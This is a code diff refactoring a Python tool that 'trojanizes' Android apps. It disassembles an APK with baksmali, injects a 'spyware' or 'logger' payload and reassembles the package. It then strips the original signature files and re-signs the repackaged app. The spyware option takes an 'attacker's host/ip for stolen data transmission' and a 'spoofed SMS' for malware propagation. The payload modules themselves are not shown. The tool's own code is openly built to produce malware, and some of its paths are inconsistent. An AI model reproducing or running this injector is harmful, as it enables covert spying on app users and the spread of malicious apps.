@@ -25,7 +25,7 @@ import zipfile
 
 from payloads.logger import Logger
 from payloads.spyware import Spyware
-from utils import helper
+from utils import util
 
 FAILURE = 21
 SUCCESS = 22
@@ -59,7 +59,7 @@ formatter = colorlog.ColoredFormatter(
         'FAILURE':  'yellow',   # 22
         'WARNING':  'yellow',   # 30
         'ERROR':    'red',      # 40
-        'CRITICAL': 'red'       # 50
+        'CRITICAL': 'red, bg_white'       # 50
     },
     reset=True
 )
@@ -73,7 +73,7 @@ logger.setLevel(logging.DEBUG)
 
 DEBUG = 1
 
-# List of available payloads
+# List of implemented payloads
 payloads = [
     "logger",
     "spyware"
@@ -108,192 +108,198 @@ def copyright():
 
 def parse_args():
     """
-    Parse command line arguments.
+    Parse and validate user command line.
     """
+    # Top-level parser
     parser = argparse.ArgumentParser(
-        description="Android assembly code injector"
+        description="Android assembly code (smali) injector"
     )
 
     parser.add_argument(
         "-a",
         "--app",
-        dest="app_path",
-        help="application to infect",
+        dest="app",
+        help="Android application to trojanize",
         required=True,
         type=str
     )
-    parser.add_argument(
-        "-p",
-        "--payload",
-        dest="payload",
-        help="payload to inject",
-        choices=payloads,
+
+    subparsers = parser.add_subparsers(
+        dest="payload, search",
+        help="available commands"
+    )
+
+    subparsers.required = True
+
+    # Parser for the "search" command
+    parser_search = subparsers.add_parser(
+        "search", 
+        help="search command - identifies the main activity"
+    )
+
+    parser_search.set_defaults(command='search')
+
+    # Parser for the "payload" command
+    parser_payload = subparsers.add_parser(
+        "payload",
+        help="payload command"
+    )
+
+    parser_payload.set_defaults(command='payload')
+    
+    parser_payload.add_argument(
+        "-d",
+        "--dest",
+        dest="destination",
+        help="the destination file or directoy for injection filtering",
+        default='',
+        required=False,
         type=str
     )
-    parser.add_argument(
-        "-ppg",
-        "--propagate",
-        dest="propagate",
-        help="spoofed SMS to send for the malware propagation",
-        type=str
-    )
-    parser.add_argument(
+
+    parser_payload.add_argument(
         "-k",
         "--keywords",
         dest="keywords",
         help="keywords (separated by ',') for injection filtering",
         default="-1",
+        required=False,
         type=str
     )
-    parser.add_argument(
-        "-s",
-        "--search",
-        dest="search",
-        help="search the main activity",
-        action="store_true"
+
+    parser_payloads = parser_payload.add_subparsers(
+        dest=", ".join(payloads),
+        help="available commands"
     )
-    parser.add_argument(
-        "-t",
-        "--target",
-        dest="target",
-        help="dir/file to target",
-        default='',
+
+    parser_payloads.required = True
+
+    # Parser for the "payload->logger" command
+    parser_payload_logger = parser_payloads.add_parser(
+        "logger", 
+        help="logger command"
+    )
+
+    parser_payload_logger.set_defaults(payload='logger')
+
+    # Parser for the "payload->logger" command
+    parser_payload_spyware = parser_payloads.add_parser(
+        "spyware", 
+        help="spyware command",
+    )
+
+    parser_payload_spyware.add_argument(
+        "-ppg",
+        "--propagate",
+        dest="propagate",
+        help="spoofed SMS to send for malware propagation",
+        required=False,
         type=str
     )
-    parser.add_argument(
+
+    parser_payload_spyware.add_argument(
         "-rh",
         "--rhost",
         dest="rhost",
-        help="attacker's host/ip address for receiving the stolen data",
+        help="attacker's host/ip for stolen data transmission",
+        required=True,
         type=str
     )
+
+    parser_payload_spyware.set_defaults(payload='spyware')
 
     return parser.parse_args()
 
 
-def check_args(args):
+def get_main_activity(app):
     """
-    Validate command line arguments.
-    """
-    if (os.path.isfile(args.app_path) and args.app_path.endswith(".apk")):
-        # or args.search with any other parameter -> BAD!
-        if (args.search and (args.payload or args.target or
-           (args.keywords != '-1') or args.rhost or args.propagate)):
-            logger.error("usage: type {} -h for further help".format(
-                sys.argv[0]))
-            sys.exit(0)
-        elif not (args.search or args.payload):
-            logger.warning("usage: at least one of the following argument is \
-                required: [-p], [-s]")
-            sys.exit(0)
-        else:
-            pass
-
-    else:
-        logger.error("{} does not exist/is not a valid .apk file".format(
-            os.path.abspath(args.app_path)))
-        sys.exit(0)
-
-
-# updated version using aapt - easier and quicker
-# result accuracy needs to be improved
-def get_main_activity_from_manifest(app_path):
-    """
-    Return the main activity.
+    Returns the main activity from the AndroidManifest.xml.
     """
     result = ""
 
     try:
         output = subprocess.check_output(
-            "aapt dump --values xmlstrings {0} AndroidManifest.xml".format(
-                os.path.abspath(app_path)),
-            shell=True
-        ).decode("UTF-8")
-        regex = re.compile("(.*[\r\n]|[\n]){5}(String #\d+: android\.intent\.category.LAUNCHER)")
-        result = regex.match(output)
+            "aapt dump badging {0}".format(app),
+            shell=True).decode("UTF-8")
+        regex = re.compile("launchable-activity:.*")
+        result = regex.search(output).group(0)
+    
     except subprocess.CalledProcessError as ex:
         logger.error("{} - {}".format(ex.returncode, ex.output))
 
     return result
 
 
-def disassemble(app_path, app_name):
-    logger.info("{:<50}".format("disassembling..."), end='', flush=True)
+def disassemble(app_absolute_path, app_name):
+    if not os.path.exists("../tmp"):
+        os.makedirs("../tmp")
 
-    if not os.path.exists("tmp"):
-        os.makedirs("tmp")
+    instruction = "java -jar ../libs/baksmali-2.2.1.jar disassemble -o {} {} ".format(
+        os.path.abspath(os.path.join("../tmp", app_name)),
+        os.path.abspath(app_absolute_path))
+    subprocess.call(instruction, shell=True)
 
-    cmd = "baksmali -p {0} -o {1}".format(
-        os.path.abspath(app_path),
-        os.path.abspath(os.path.join("tmp", app_name)))
-    subprocess.call([cmd], shell=True)
-
-    # Create a copy of the original app's source code
+    # Create a copy of the legitimate app source code
     if DEBUG == 1:
-        helper.copy_dir(os.path.join("tmp", app_name),
-                        os.path.join("debug", app_name))
+        if not os.path.exists("../tmp"):
+            os.makedirs("../tmp")
 
-    print.success("DONE")
+        util.copy(os.path.join("../tmp", app_name),
+                        os.path.join("../debug", app_name))
 
 
 def reassemble(payload):
-    logger.info("{:<50}".format("reassembling..."), end='', flush=True)
-
     # Create a copy of the infected app's source code
     if DEBUG == 1:
-        helper.copy_dir(os.path.join("tmp", payload.app_name),
-                        os.path.join("debug", payload.app_name + "-trojan"))
+        util.copy(os.path.join("../tmp", payload.app_name),
+                  os.path.join("../debug", payload.app_name + "-trojan"))
 
     # Create the classes.dex
-    cmd = "smali {0} -o {1}".format(
-        os.path.abspath(os.path.join("tmp", payload.app_name)),
-        os.path.abspath(os.path.join("tmp", "classes.dex")))
+    instruction = "java -jar ../libs/smali-2.2.1.jar {0} -o {1}".format(
+        os.path.abspath(os.path.join("../tmp", payload.app_name)),
+        os.path.abspath(os.path.join("../tmp", "classes.dex")))
 
-    subprocess.call([cmd], shell=True)
+    subprocess.call(instruction, shell=True)
 
     # Move classes.dex and AndroidManifest then clean-up
-    # Create an app_path-mod folder and erase its certificates
-    zipfile.ZipFile(payload.app_path).extractall(os.path.join(
-        "tmp", payload.app_name))
+    # Create an app-mod folder and erase its certificates
+    zipfile.ZipFile(payload.app_absolute_path).extractall(os.path.join(
+        "tmp", payload.name))
 
-    for root, subdirs, files in os.walk(os.path.join("tmp", payload.app_name,
+    for root, subdirs, files in os.walk(os.path.join("../tmp", payload.app_name,
                                                      "META-INF")):
         for file in files:
-            f_path = os.path.join("tmp", payload.app_name, "META-INF", file)
+            file_path = os.path.join("../tmp", payload.app_name, "META-INF", file)
             if (file != "MANIFEST.MF" and (".RSA" in file or ".SF" in file)):
-                os.remove(os.path.abspath(f_path))
+                os.remove(os.path.abspath(file_path))
 
-    # Move the new classes.dex and AndroidManifest into the modified app_path
+    # Move the new classes.dex and AndroidManifest into the modified app
     # folder
-    helper.move_file(os.path.join("tmp", "classes.dex"),
-                     os.path.join("tmp", payload.app_name, "classes.dex"))
+    util.move_file(os.path.join("./tmp", "classes.dex"),
+                     os.path.join("../tmp", payload.app_name, "classes.dex"))
 
     if (payload.name == "spyware"):
-        helper.move_file(os.path.join("tmp", "AndroidManifest.xml"),
-                         os.path.join("tmp", payload.app_name,
+        util.move_file(os.path.join("../tmp", "AndroidManifest.xml"),
+                         os.path.join("../tmp", payload.app_name,
                                       "AndroidManifest.xml"))
 
     # Creation of the final .apk
-    # Create the app_path-mod.zip, rename it to app_path-mod.apk and remove
-    # the app_path-mod folder
-    shutil.make_archive(os.path.join("tmp", payload.app_name), "zip",
-                        os.path.join("tmp", payload.app_name))
+    # Create the app-mod.zip, rename it to app-mod.apk and remove
+    # the app-mod folder
+    shutil.make_archive(os.path.join("../tmp", payload.app_name), "zip",
+                        os.path.join("../tmp", payload.app_name))
 
-    helper.move_file(os.path.join("tmp", payload.app_name + ".zip"),
+    util.move_file(os.path.join("../tmp", payload.app_name + ".zip"),
                      os.path.join("trojans", payload.app_name + ".apk"))
-    shutil.rmtree("tmp")
-
-    logger.success("DONE")
+    shutil.rmtree("../tmp")
 
     # Sign the new apk with the certificate within certs/
-    logger.info("{:<50}".format("signing..."), end='', flush=True)
+    logger.info("signing...")
 
-    cmd = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore \
+    instruction = "../libs//jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore \
     cert/my-release-key.keystore -storepass password {0} alias_name".format(
-        os.path.join("trojans", payload.app_name + ".apk"))
-    subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL)
-
-    logger.success("DONE")
+        os.path.join("../trojans", payload.app_name + ".apk"))
+    subprocess.call(instruction, shell=True, stdout=subprocess.DEVNULL)
 
 
 def main():
@@ -302,31 +308,36 @@ def main():
         copyright()
 
         args = parse_args()
-        check_args(args)
-
-        app_path = os.path.abspath(args.app_path)
-        head, tail = os.path.split(app_path)
+        
+        app_absolute_path = os.path.abspath(args.app)
+        head, tail = os.path.split(app_absolute_path)
         app_name = os.path.splitext(tail)[0]
 
-        if (args.search):
-            logger.info("{:<50}".format("searching the main activity..."))
-            main_activity = get_main_activity_from_manifest(app_path)
-            logger.success("parse the following output:\n{}".format(
-                main_activity))
+        if (args.command == "search"):
+            logger.info("identifying the main activity...")
+            main_activity = get_main_activity(app_absolute_path)
+            logger.success("{}".format(main_activity))
 
-        elif (args.payload):
-            disassemble(app_path, app_name)
+        elif (args.command == "payload"):
+            logger.info("disassembling...")
+            logger.info("this operation might take some time")
+            disassemble(app_absolute_path, app_name)
 
             if(args.payload == "spyware"):
                 payload = Spyware(args)
             elif (args.payload == "logger"):
                 payload = Logger(args)
 
+            logger.info("injecting...")
             payload.run()
+
+            logger.info("reassembling...")
+            logger.info("this operation might take some time")
             reassemble(payload)
 
     except KeyboardInterrupt:
         logger.error("you pressed Ctrl+C")
+
         if os.path.exists("tmp"):
             shutil.rmtree("tmp", ignore_errors=True)
 
